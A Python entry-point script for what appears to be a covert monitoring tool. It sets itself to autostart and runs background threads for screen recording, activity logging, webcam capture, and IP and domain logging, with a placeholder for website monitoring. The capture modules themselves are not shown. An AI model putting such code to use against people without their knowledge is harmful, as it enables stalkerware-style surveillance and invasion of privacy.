import os
import sys
import threading
import time
from config import Config
from utils import (
    is_already_running, log_error, log_info,
    log_ip_and_domains, register_startup
)
from recorder import record_all_screens
from logger import ActivityLogger
from camera import CameraCapture
from installer import AutoStart

def start_website_monitoring(log_dir):
    # Placeholder for website monitoring function
    # You can implement the function for monitoring websites here.
    pass

def main():
    if is_already_running():
        sys.exit()

    try:
        config = Config()
    except Exception as e:
        with open("early_crash.log", "w") as f:
            f.write(f"Startup failed: {str(e)}\n")
        sys.exit()

    try:
        log_info("App started successfully", config.base_folder)
        AutoStart.ensure_startup(config.app_name, config.exe_path)

        threading.Thread(target=record_all_screens, args=(config.video_dir,), daemon=True).start()
        threading.Thread(target=ActivityLogger(config).run, daemon=True).start()
        threading.Thread(target=CameraCapture(config).run, daemon=True).start()
        threading.Thread(target=log_ip_and_domains, args=(config.log_dir,), daemon=True).start()
        threading.Thread(target=start_website_monitoring, args=(config.log_dir,), daemon=True).start()

        while True:
            time.sleep(1)

    except Exception as e:
        log_error(f"Unexpected crash in main: {str(e)}")


if __name__ == "__main__":
    main()
